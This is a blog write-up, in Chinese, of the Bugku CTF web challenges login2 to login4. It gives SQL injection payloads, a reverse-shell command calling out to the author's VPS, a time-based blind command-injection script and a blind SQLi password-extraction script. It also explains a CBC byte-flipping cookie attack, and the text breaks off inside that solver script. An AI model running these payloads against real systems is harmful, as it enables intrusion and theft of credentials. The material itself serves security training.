@@ -1,0 +1,1279 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+  
+
+
+  
+
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.38.1 with theme Tranquilpeak 0.4.3-BETA">
+    <title>Bugku Login</title>
+    <meta name="author" content="CLtheorem">
+    <meta name="keywords" content="">
+
+    <link rel="icon" href="/favicon.png">
+    
+
+    
+    <meta name="description" content="bugku Web题login1~4的writeup。
+    
+    ">
+    <meta property="og:description" content="bugku Web题login1~4的writeup。
+    
+    ">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Bugku Login">
+    <meta property="og:url" content="/2019/03/bugku-login/">
+    <meta property="og:site_name" content="CLtheorem">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="CLtheorem">
+    <meta name="twitter:description" content="bugku Web题login1~4的writeup。
+    
+    ">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=640">
+    
+
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="/css/style-jsjn0006wyhpyzivf6yceb31gvpjatbcs3qzjvlumobfnugccvobqwxnnaj8.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="/">CLtheorem</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=90" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="/#about">
+          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/5450acc316b264c8e7c7b21291faf09a?s=110" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">CLtheorem</h4>
+        
+          <h5 class="sidebar-profile-bio">自强不息，止于至善；敏而好学，致知无央</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/CLtheorem">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      Bugku Login
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2019-03-03T10:55:53&#43;08:00">
+        
+  三月 3, 2019
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="/categories/web">WEB</a>
+    
+  
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">	
+              <p>bugku Web题login1~4的writeup。
+    
+    <h1 id="table-of-contents">目录</h1><nav id="TableOfContents">
+<ul>
+<li><a href="#login1">login1</a></li>
+<li><a href="#login2">login2</a></li>
+<li><a href="#login3">login3</a></li>
+<li><a href="#login4">login4</a></li>
+</ul>
+</nav></p>
+
+<h1 id="login1">login1</h1>
+
+<h1 id="login2">login2</h1>
+
+<p><img src="/post/images/login2_0.jpg" alt="login2_0" />
+题目链接：<a href="http://123.206.31.85:49165/login.php">http://123.206.31.85:49165</a></p>
+
+<p>响应头中有个tip，base64解码之后内容如下：</p>
+
+<pre><code>$sql=&quot;SELECT username,password FROM admin WHERE username='&quot;.$username.&quot;'&quot;;
+if (!empty($row) &amp;&amp; $row['password']===md5($password)){
+}
+</code></pre>
+
+<p>有了源码就很简单了，结合题目提示中的union，采用如下payload：</p>
+
+<pre><code>&quot;username=balabala' union select 1,null#&amp;password[]=olaola&quot;
+</code></pre>
+
+<p>或者</p>
+
+<pre><code>&quot;username=balabala' union select 1,md5(1)#&amp;password=1&quot;
+</code></pre>
+
+<p>登陆成功后来到了一个apache进程监控系统，可以查看一些日志信息。执行框除了提供grep的参数外，如题目提示，是存在命令执行的，只不过不会返回执行结果，但通过输入<code>11;sleep 3</code>可以发现响应的延迟，由此来确定存在命令执行。
+<img src="/post/images/login2_1.jpg" alt="login2_1" /></p>
+
+<p>这里我们就可以有两种思路，反向shell和基于时间的盲注。</p>
+
+<ol>
+<li><p>反向shell</p>
+
+<p>上图中我们也可以看到两位老哥留下的“犯罪记录”。</p>
+
+<p>先在自己的vps上使用nc，进行监听，我选择2233端口：</p>
+
+<pre><code>nc -lvp 2233
+</code></pre>
+
+<p>然后在执行框内输入</p>
+
+<pre><code>11;bash -i &gt;&amp; /dev/tcp/the_ip_of_my_vps/2233 0&gt;&amp;1
+</code></pre>
+
+<p>即可反弹shell，查看flag。
+<img src="/post/images/login2_2.jpg" alt="login2_2.jpg" /></p></li>
+
+<li><p>时间盲注</p>
+
+<p>反向shell虽然简单，但不适用线下赛的闭网环境。取而代之，我们可以结合sleep命令，进行时间盲注，与sql注入同理。</p>
+
+<p>脚本如下：
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight python language-python">
+  <figcaption>
+    
+      <span>time_injection.py</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-python"><code class="python">import requests
+
+if __name__ == &#39;__main__&#39;:
+    login2_session = requests.Session()
+    login2_session.proxies={&#39;http&#39;:&#39;127.0.0.1:8080&#39;}
+    login_url = &#39;http://123.206.31.85:49165/login.php&#39;
+    apache_url = &#39;http://123.206.31.85:49165/index.php&#39;
+    for i in range(0,100):
+        for j in range(33,126):
+            # get directory
+            c = &#39;1;list=`ls`;if [ ${{list:{index}:1}} = {char} ];then sleep 2;fi&#39;.format(index=i,char=chr(j))
+            # get flag
+            # c = &#39;1;list=`cat fLag_c2Rmc2Fncn-MzRzZGZnNDc.txt`;if [ ${{list:{index}:1}} = {char} ];then sleep 2;fi&#39;.format(index=i,char=chr(j))
+            data1 = {
+                &#39;username&#39;:&#34;neko&#39; union select 1,null#&#34;,
+                &#39;password[]&#39;:&#39;1&#39;
+            }
+            data2 = {
+                &#39;c&#39;:c
+            }
+            login2_session.post(login_url,data=data1)
+            try:
+                login2_session.post(apache_url,data=data2,timeout=2)
+            except requests.exceptions.ReadTimeout:
+                print(chr(j), end=&#39;&#39;)
+                break</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+可以得到目录信息：
+<img src="/post/images/login2_3.jpg" alt="login2_3.jpg" /></p>
+
+<p>再切换下代码11和13行的变量c，即可获取到flag。</p></li>
+</ol>
+
+<h1 id="login3">login3</h1>
+
+<p><img src="/post/images/login3_0.jpg" alt="login3_0" /></p>
+
+<p>题目链接：<a href="http://123.206.31.85:49167/">http://123.206.31.85:49167</a></p>
+
+<ol>
+<li><p>初步探测</p>
+
+<p>首先尝试登陆，发现有两种错误提示：
+<img src="/post/images/login3_1.jpg" alt="login3_1" /></p>
+
+<p><img src="/post/images/login3_2.jpg" alt="login3_2" /></p>
+
+<p>由此可以推测，后台用户名和密码是分开查询的，并且这两种返回值将是我们布尔盲注的判断依据。（用户名admin是存在的，即对应password error的结果）</p>
+
+<p>一番测试后发现过滤了不少东西，关键的有空格、逗号、等号以及<code>and</code>。对此，可以有以下应对措施：</p>
+
+<ul>
+<li>使用<code>()</code>在一定程度上避免空格的使用</li>
+<li>无逗号注入不是问题</li>
+<li>使用按位异或运算符<code>^</code>来避免<code>and</code>的使用</li>
+<li>改变判等逻辑，使用<code>&lt;&gt;</code>替代<code>=</code> （这一点不是必要的）</li>
+</ul>
+
+<p>在构造初步的payload之前我们现在看一下mysql关于where条件句的一个特点：</p>
+
+<pre><code>mysql&gt; select username,password from users;
++-----------+-----------+
+| username  | password  |
++-----------+-----------+
+| lawless   | lawless   |
+| admin     | admin123  |
++-----------+-----------+
+
+mysql&gt; select password from users where username=0;
++-----------+
+| password  |
++-----------+
+| lawless   |
+| admin123  |
++-----------+
+</code></pre>
+
+<p>可见，当where条件是和数字<code>0</code>的判等时，此条件并无约束力。</p>
+
+<p>由此，回到这道题目，我们可以通过异或运算，使我们提供的用户名在数据库中被解析为数字<code>0</code>，这样后台查询语句就一定可以查询得到用户名，然后在密码判断后返回给我们<code>password error!</code>的错误提示，反之，若解析结果不为<code>0</code>则会得到<code>username does not exist!</code>的错误提示。</p>
+
+<p>payload1：<code>0'^0#</code> （以下payload均指用户名，密码随意），这条payload得到的结果是<code>password error!</code>，由此验证上述思路。</p></li>
+
+<li><p>注入</p>
+
+<p>我们可以结合脚本，使用payload：<code>0'^length(database())^8#</code>和<code>0'^ascii(mid(database()from(1)))^98#</code>来分别爆破数据库名长度及库名，得到库名为<code>blindsql</code>，但这好像并没什么用，因为<code>information</code>也被过滤了，无法进一步查询到表名。</p>
+
+<p>看网上各位的wp到这一步都是猜表名和字段名，对此我也没什么好说的，使用<code>0'^((select(count(password))from(admin))&gt;0)^1#</code>可以验证表名为admin，字段名为password。当然在此之前应该先猜表名，确定表名后在确定字段名。</p>
+
+<p>得到表名和用字段名后就可以爆破密码啦，是一条md5值（被大家玩成付费的了），使用用户名（admin）和破解后的密码登陆即可查看flag。</p></li>
+</ol>
+
+<p>
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight python language-python">
+  <figcaption>
+    
+      <span>blindsql.py</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-python"><code class="python">class Login3(object):
+    def __init__(self):
+        self.url = &#39;http://123.206.31.85:49167/index.php&#39;
+        self.data = {
+            &#39;username&#39;: &#39;&#39;,
+            &#39;password&#39;: &#39;123456&#39;
+        }
+
+    # get length(database())
+    def get_dblen(self):
+        for i in range(1,40):
+            self.data[&#39;username&#39;] = &#34;0&#39;^length(database())^{length}#&#34;.format(length=i)
+            if len(requests.post(self.url, self.data).text) != 830:
+                print(&#39;len(database()) =&#39;, i)
+                return i
+
+    # get db name
+    def get_dbname(self):
+        db_len = self.get_dblen()
+        db_name = &#39;&#39;
+        print(&#39;db name: &#39;, end=&#39;&#39;)
+        for i in range(1, db_len&#43;1):
+            for ascii_char in range(21, 127):
+                self.data[&#39;username&#39;] = &#34;0&#39;^ascii(mid(database()from({start})))^{char_num}#&#34;.format(start=i,char_num=ascii_char)
+                if len(requests.post(self.url, self.data).text) != 830:
+                    print(chr(ascii_char), end=&#39;&#39;)
+                    db_name &#43;= chr(ascii_char)
+                    break
+        print()
+        return db_name
+
+    # get pwd
+    def get_pwd(self):
+        len_pwd = 0
+        for i in range(1,40):
+            self.data[&#39;username&#39;] = &#34;0&#39;^length((select(password)from(admin)))^{length}#&#34;.format(length=i)
+            if len(requests.post(self.url, self.data).text) != 830:
+                len_pwd = i
+        print(&#34;pwd length:&#34;,len_pwd)
+        print(&#34;password: &#34;, end=&#39;&#39;)
+        for i in range(1, len_pwd&#43;1):
+            for ascii_char in range(21, 127):
+                self.data[&#39;username&#39;] = &#34;0&#39;^ascii(mid((select(password)from(admin))from({start})))^{char_num}#&#34;.format(start=i, char_num=ascii_char)
+                if len(requests.post(self.url, self.data).text) != 830:
+                    print(chr(ascii_char), end=&#39;&#39;)
+                    break
+
+if __name__ == &#39;__main__&#39;:
+    login3 = Login3()
+    login3.get_pwd()</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<img src="/post/images/login3_3.jpg" alt="login3_3" /></p>
+
+<h1 id="login4">login4</h1>
+
+<p><img src="/post/images/login4_0.jpg" alt="" /></p>
+
+<p>题目链接：<a href="http://123.206.31.85:49168">http://123.206.31.85:49168</a></p>
+
+<p>一个简单的登陆界面，除了用户名为<code>admin</code>时不让登外，其他用户名密码随便输都可以登录。
+<img src="/post/images/login4_5.jpg" alt="" />
+分析登录响应头可以看到如下关键信息：
+<img src="/post/images/login4_6.jpg" alt="" /></p>
+
+<p><code>cookie</code>中包含了两个参数<code>iv</code>和<code>cipher</code>，很好理解，这里的<code>iv</code>正是CBC中的初始向量<code>initialization vector</code>，<code>cipher</code>也就是密文了。</p>
+
+<p>但这些信息远远不够，毕竟我们对加密内容一无所知。所以，这也算是一个潜规则，所谓CBC字节翻转攻击的题目，往往伴随着源码泄露。</p>
+
+<p>或猜测或扫描我们可以在网站根目录下找到一个vim异常关闭产生的备份文件<code>.index.php.swp</code>，下载下来恢复后得到如下源码：
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>index.php</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34; /&gt;
+&lt;title&gt;Login Form&lt;/title&gt;
+&lt;link href=&#34;static/css/style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34; /&gt;
+&lt;script type=&#34;text/javascript&#34; src=&#34;static/js/jquery.min.js&#34;&gt;&lt;/script&gt;
+&lt;script type=&#34;text/javascript&#34;&gt;
+$(document).ready(function() {
+    $(&#34;.username&#34;).focus(function() {
+        $(&#34;.user-icon&#34;).css(&#34;left&#34;,&#34;-48px&#34;);
+    });
+    $(&#34;.username&#34;).blur(function() {
+        $(&#34;.user-icon&#34;).css(&#34;left&#34;,&#34;0px&#34;);
+    });
+
+    $(&#34;.password&#34;).focus(function() {
+        $(&#34;.pass-icon&#34;).css(&#34;left&#34;,&#34;-48px&#34;);
+    });
+    $(&#34;.password&#34;).blur(function() {
+        $(&#34;.pass-icon&#34;).css(&#34;left&#34;,&#34;0px&#34;);
+    });
+});
+&lt;/script&gt;
+&lt;/head&gt;
+
+&lt;?php
+    define(&#34;SECRET_KEY&#34;, file_get_contents(&#39;/root/key&#39;));
+    define(&#34;METHOD&#34;, &#34;aes-128-cbc&#34;);
+    session_start();
+
+    function get_random_iv(){
+        $random_iv=&#39;&#39;;
+        for($i=0;$i&lt;16;$i&#43;&#43;){
+            $random_iv.=chr(rand(1,255));
+        }
+        return $random_iv;
+    }
+
+    function login($info){
+        $iv = get_random_iv();
+        $plain = serialize($info);
+        $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
+        $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];
+        setcookie(&#34;iv&#34;, base64_encode($iv));
+        setcookie(&#34;cipher&#34;, base64_encode($cipher));
+    }
+
+    function check_login(){
+        if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){
+            $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);
+            $iv = base64_decode($_COOKIE[&#34;iv&#34;]);
+            if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
+                $info = unserialize($plain) or die(&#34;&lt;p&gt;base64_decode(&#39;&#34;.base64_encode($plain).&#34;&#39;) can&#39;t unserialize&lt;/p&gt;&#34;);
+                $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];
+            }else{
+                die(&#34;ERROR!&#34;);
+            }
+        }
+    }
+
+    function show_homepage(){
+        if ($_SESSION[&#34;username&#34;]===&#39;admin&#39;){
+            echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;
+            echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;
+        }else{
+            echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;
+            echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;
+        }
+        echo &#39;&lt;p&gt;&lt;a href=&#34;loginout.php&#34;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;
+    }
+
+    if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])){
+        $username = (string)$_POST[&#39;username&#39;];
+        $password = (string)$_POST[&#39;password&#39;];
+        if($username === &#39;admin&#39;){
+            exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);
+        }else{
+            $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);
+            login($info);
+            show_homepage();
+        }
+    }else{
+        if(isset($_SESSION[&#34;username&#34;])){
+            check_login();
+            show_homepage();
+        }else{
+            echo &#39;&lt;body class=&#34;login-body&#34;&gt;
+                    &lt;div id=&#34;wrapper&#34;&gt;
+                        &lt;div class=&#34;user-icon&#34;&gt;&lt;/div&gt;
+                        &lt;div class=&#34;pass-icon&#34;&gt;&lt;/div&gt;
+                        &lt;form name=&#34;login-form&#34; class=&#34;login-form&#34; action=&#34;&#34; method=&#34;post&#34;&gt;
+                            &lt;div class=&#34;header&#34;&gt;
+                            &lt;h1&gt;Login Form&lt;/h1&gt;
+                            &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&#34;content&#34;&gt;
+                            &lt;input name=&#34;username&#34; type=&#34;text&#34; class=&#34;input username&#34; value=&#34;Username&#34; onfocus=&#34;this.value=\&#39;\&#39;&#34; /&gt;
+                            &lt;input name=&#34;password&#34; type=&#34;password&#34; class=&#34;input password&#34; value=&#34;Password&#34; onfocus=&#34;this.value=\&#39;\&#39;&#34; /&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&#34;footer&#34;&gt;
+                            &lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Login&#34; class=&#34;button&#34; /&gt;
+                            &lt;/div&gt;
+                        &lt;/form&gt;
+                    &lt;/div&gt;
+                &lt;/body&gt;&#39;;
+        }
+    }
+?&gt;
+&lt;/html&gt;</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure></p>
+
+<p>理理代码逻辑：</p>
+
+<p>首先正常访问、登录（用户名admin禁止登录）后，由服务器设置<code>cookie</code>和<code>session</code>信息，并跳转到Hello界面。这里有两点：</p>
+
+<ol>
+<li><code>cookie</code>内容
+
+<ul>
+<li><code>cipher=urlencode(base64_encode(Encrypt(serialize(array('username'=&gt;$username,'password'=&gt;$password)))))</code>加密方式为<code>AES-128-CBC</code>。</li>
+<li><code>iv=urlencode(base64_encode(CBC的初始向量))</code></li>
+</ul></li>
+<li><code>session</code>要求我们后续使用脚本实现时要注意保持会话。</li>
+</ol>
+
+<p>其次若服务器检测到客户端请求头中的session信息，则无需用户登录，服务器获取<code>cookie</code>信息，进行密文解密，抽取用户名信息，设置<code>session</code>，跳转到Hello界面。这里关键在源码中<code>check_login()</code>函数，该函数解密<code>cookie</code>中<code>cipher</code>信息得到明文，然后反序列化明文来获取用户名，若反序列化失败则返回该明文的base64编码，这一点是CBC字节翻转攻击得以实现的关键。</p>
+
+<p>有用信息大致就是这些，接下来是攻击思路：</p>
+
+<p>我们先从CBC说起，CBC即Cipher Block Chaining(密码分组链模式)，是分组密码的工作模式之一。原理较为简单，加解密过程如下图所示：
+<img src="/post/images/login4_1.jpg" alt="" /></p>
+
+<p>其中IV为随机的初始向量，每个分组长度为128bit(16字节)。</p>
+
+<p>现在我们来考虑明文P的前两个分组P1和P2的加解密情况。</p>
+
+<p>加密过程：
+<img src="/post/images/login4_2.jpg" alt="" />
+解密过程:
+<img src="/post/images/login4_3.jpg" alt="" /></p>
+
+<p>这一题中首先以用户名<code>admi0</code>密码<code>123456</code>登录，可以得到明文<code>P=&quot;a:2:{s:8:&quot;username&quot;;s:5:&quot;admi0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;}&quot;</code>的密文C（即<code>cipher</code>）。接下来如果我们能够通过修改密文C，使得明文P中的<code>admi0</code>变为<code>admin</code>即<code>0</code>改为<code>n</code>，就可以顺利拿到flag，注意到<code>0</code>是在第二个明文分组（16字节一组）P2中的，所以我们需要改变的其实就是P2。这一过程便是CBC字节翻转攻击，至于怎么翻转的，且看下文。</p>
+
+<p>关于CBC字节翻转攻击：
+<img src="/post/images/login4_4.jpg" alt="" /></p>
+
+<p>由上述原理对应到如下攻击过程：</p>
+
+<pre><code>- 登录获取cookie中的cipher和iv
+- 字节翻转计算出new_cipher  # 公式(1)
+- 向服务器发送包含new_cipher和iv的cookie  
+- 服务器解密后反序列化失败返回新的明文new_plain  # 公式(5)
+- 根据new_plain、原明文plain、原iv计算出new_iv  # 公式(6)
+- 向服务器发送包含new_cipher和new_iv的cookie，获取到flag
+</code></pre>
+
+<p>上述过程手工实现起来略有繁琐，需要细心点。写个脚本可以加深对这一攻击过程的理解。</p>
+
+<p>因为涉及php的序列化，python脚本不如php脚本来的方便，我的解题脚本如下：
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>Login4.php</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 